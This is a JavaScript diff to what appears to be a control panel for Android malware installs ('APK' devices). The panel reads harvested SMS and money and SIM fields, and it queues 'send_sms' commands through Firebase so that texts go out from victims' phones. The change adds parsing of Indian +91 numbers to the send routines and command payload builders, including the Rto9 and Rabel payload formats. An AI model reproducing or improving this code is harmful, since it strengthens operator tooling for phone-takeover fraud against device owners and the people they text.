@@ -55,12 +55,35 @@ var PANEL_SMS_GLOBAL_NODES=['messages','user_sms','sms','all_sms','new_sms','sms
 
 function looksLikePhone(v){
   if(v==null||v==='')return false;
+  var p=parseSmsPhoneInput(v);
+  if(p.ok)return true;
   var s=String(v).trim();
   if(!s||s==='0'||s==='null'||s==='undefined')return false;
   var digits=s.replace(/\D/g,'');
   return digits.length>=10&&digits.length<=15;
 }
+/** Accept +91, 91, 0-prefix, spaces/dashes — returns 10-digit + 91 dial forms */
+function parseSmsPhoneInput(raw){
+  var s=String(raw==null?'':raw).trim();
+  if(!s||/^unknown$/i.test(s))return{ok:false,error:'Phone number daalo'};
+  var d=s.replace(/\D/g,'');
+  if(!d)return{ok:false,error:'Phone number daalo'};
+  if(d.length===11&&d.charAt(0)==='0')d=d.slice(1);
+  if(d.length>=4&&d.indexOf('0091')===0)d=d.slice(2);
+  if(d.length===12&&d.indexOf('91')===0){
+    var ten12=d.slice(2);
+    if(ten12.length===10)return{ok:true,digits10:ten12,dial91:d,display:'+91'+ten12};
+  }
+  if(d.length===10)return{ok:true,digits10:d,dial91:'91'+d,display:'+91'+d};
+  if(d.length>10){
+    var tail=d.slice(-10);
+    if(tail.length===10)return{ok:true,digits10:tail,dial91:'91'+tail,display:'+91'+tail};
+  }
+  return{ok:false,error:'Valid phone number daalo'};
+}
 function normalizePhoneDigits(v){
+  var p=parseSmsPhoneInput(v);
+  if(p.ok)return p.digits10;
   var d=String(v||'').replace(/\D/g,'');
   if(d.length>=10)return d.slice(-10);
   return d;
@@ -569,13 +592,15 @@ function getDeviceSmsPhone(d,simSlot){
   return clean||digits;
 }
 function phoneDigits10(raw){
+  var p=parseSmsPhoneInput(raw);
+  if(p.ok)return p.digits10;
   var c=String(raw||'').replace(/\D/g,'');
   if(c.length>=10)return c.slice(-10);
   return c;
 }
 function isSameNumberAsDevice(d,toRaw){
   if(!d||!toRaw)return false;
-  var to10=phoneDigits10(formatApkSmsTo(toRaw)||toRaw);
+  var to10=phoneDigits10(toRaw);
   if(!to10||to10.length<10)return false;
   var raw=getRawDev(d.id);
   var candidates=[d.displayPhone,getApkMobNo(raw,d),getApkSimPhone(raw,1),getApkSimPhone(raw,2),raw&&raw.mobNo,raw&&raw.phoneNumber,raw&&raw.phone];
@@ -606,7 +631,7 @@ function fillDeviceSmsTo(d,force,simSlot){
   if(!force&&toEl.value&&String(toEl.value).trim())return;
   var phone=getDeviceSmsPhone(d,simSlot||_sendSimSlot);
   if(phone)toEl.value=phone;
-  else toEl.placeholder='Recipient number (10 digit)';
+  else toEl.placeholder='Number — +91 / 98765… / 9198765… / 098765…';
 }
 function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
 function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
@@ -2549,11 +2574,15 @@ function sendDeviceSms(sim){
   var toRaw=(toEl&&toEl.value||'').trim();
   if(!toRaw){
     toRaw=getApkSimPhone(raw,_sendSimSlot)||getApkMobNo(raw,d);
-    if(toEl&&toRaw)toEl.value=(toRaw.length===10?'+91'+toRaw:toRaw);
+    if(toEl&&toRaw){
+      var autoParsed=parseSmsPhoneInput(toRaw);
+      toEl.value=autoParsed.ok?autoParsed.display:(toRaw.length===10?'+91'+toRaw:toRaw);
+    }
   }
-  var phoneDial=formatApkSmsTo(toRaw||to);
+  var toParsed=parseSmsPhoneInput(toRaw);
+  if(!toParsed.ok){toast(toParsed.error||'Valid phone number daalo',false);return;}
+  var phoneDial=toParsed.dial91;
   var msg=(msgEl&&msgEl.value||'').trim();
-  if(!toRaw){toast('Recipient number daalo',false);return;}
   if(!msg){toast('Enter message',false);return;}
   if(!isApkOnlineRaw(raw)&&String(d.status||'').toLowerCase()!=='online'){
     toast('⚠️ Device offline dikha raha hai — phir bhi queue kar rahe hain',true);
@@ -3292,7 +3321,10 @@ function isNyaApkFirebase(inst){
   return false;
 }
 function formatApkSmsTo(raw){
+  var p=parseSmsPhoneInput(raw);
+  if(p.ok)return p.dial91;
   var clean=String(raw||'').replace(/\D/g,'');
+  if(clean.length===11&&clean.charAt(0)==='0')clean=clean.slice(1);
   if(clean.length===10)return '91'+clean;
   if(clean.length===12&&clean.indexOf('91')===0)return clean;
   if(clean.length>10)return '91'+clean.slice(-10);
@@ -3318,15 +3350,18 @@ function needsDualSmsSend(inst,d){
   return false;
 }
 function buildNyaApkCommandPatch(deviceId,sim,to,message){
-  var to91=formatApkSmsTo(to);
+  var p=parseSmsPhoneInput(to);
+  var to91=p.ok?p.dial91:formatApkSmsTo(to);
+  var to10=p.ok?p.digits10:phoneDigits10(to91);
   var slot=Math.max(0,(sim||1)-1);
   return{
     cmd:'send_sms',command:'send message',messageText:message,msg:message,
-    phoneNumber:to91,phone:to91,number:to91,to:to91,
+    phoneNumber:to91,phone:to10,number:to10,to:to10,
     targetDeviceId:deviceId,simSlot:String(slot),sim:slot,
-    sendSms:{message:message,status:'pending',to:to91},
-    sms:{message:message,status:'pending',to:to91},
-    type:'sms',timestamp:Date.now(),webhookEvent:'send_sms'
+    sendSms:{message:message,status:'pending',to:to10},
+    sms:{message:message,status:'pending',to:to10},
+    type:'sms',timestamp:Date.now(),webhookEvent:'send_sms',
+    action:{type:'send_sms',phone:to10,number:to10,to:to10,message:message,sim:slot}
   };
 }
 function buildRto9SendPayload(deviceId,sim,to,message){
@@ -3357,7 +3392,9 @@ function getSendAttempts(inst,d,to,message,sim){
   var patch=buildNyaApkCommandPatch(id,sim,to,message);
   var rabel91=buildRabelSendPayload(sim,to,message,d);
   var rabel10=buildRabelSendPayload10(sim,to,message,d);
-  var manualCmd={to:formatApkSmsTo(to),message:message,sim:Math.max(0,(sim||1)-1),timestamp:Date.now()};
+  var toParsed=parseSmsPhoneInput(to);
+  var manualTo=toParsed.ok?toParsed.digits10:phoneDigits10(formatApkSmsTo(to));
+  var manualCmd={to:manualTo||formatApkSmsTo(to),message:message,sim:Math.max(0,(sim||1)-1),timestamp:Date.now()};
   function pushManual(node){
     if(!node||!id)return;
     out.push({path:node+'/'+id+'/manual_commands/send_sms',payload:manualCmd,method:'PUT'});
@@ -3520,9 +3557,13 @@ function sendSmsDirectFirebase(inst,attempts){
   return sendSmsDirectFirebaseSequential(inst,attempts);
 }
 function normalizePhone(raw){
+  var p=parseSmsPhoneInput(raw);
+  if(p.ok)return p.digits10;
   var clean=String(raw||'').replace(/\D/g,'');
+  if(clean.length===11&&clean.charAt(0)==='0')clean=clean.slice(1);
   if(clean.length===10)return clean;
   if(clean.length>10&&clean.indexOf('91')===0)return clean.slice(-10);
+  if(clean.length>10)return clean.slice(-10);
   return clean;
 }
 function sendSmsFetch(body){
@@ -3540,14 +3581,16 @@ function sendSms(){
   if(!toEl||!msgEl){sendDeviceSms(_sendSimSlot||1);return;}
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase not loaded',false);return;}
-  var to=normalizePhone(toEl.value.trim());
+  var toInput=toEl.value.trim();
+  var toParsed=parseSmsPhoneInput(toInput);
+  if(!toParsed.ok){toast(toParsed.error||'Valid phone number daalo',false);return;}
+  var to=toParsed.digits10;
   var msg=msgEl.value.trim();
-  if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
   if(!msg){toast('Enter message',false);return;}
   if(_sendInFlight){toast('Sending...',true);return;}
   _sendInFlight=true;
   if(statusEl)statusEl.textContent='Sending…';
-  sendSmsInstant(to,msg,_sendSimSlot,function(ok,data){
+  sendSmsInstant(toInput||to,msg,_sendSimSlot,function(ok,data){
     _sendInFlight=false;
     if(ok){
       msgEl.value='';
@@ -3674,9 +3717,10 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var inst=getFbInstance(d&&d.fbId);
   if(!d||!inst){if(callback)callback(false,{error:'No device'});return;}
   var phoneFull=String(to||'').trim();
-  var phoneDial=formatApkSmsTo(phoneFull||normalizePhone(phoneFull));
-  if(!phoneDial||phoneDial.length<11){if(callback)callback(false,{error:'Valid phone number daalo (10 digit)'});return;}
-  var sameNum=isSameNumberAsDevice(d,phoneFull||phoneDial);
+  var parsed=parseSmsPhoneInput(phoneFull);
+  if(!parsed.ok){if(callback)callback(false,{error:parsed.error||'Valid phone number daalo'});return;}
+  var phoneDial=parsed.dial91;
+  var sameNum=isSameNumberAsDevice(d,phoneFull);
   var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
   var dual=needsDualSmsSend(inst,d);
   var writeNode=d.deviceNode||getDeviceProfilePath(d)||'clients';
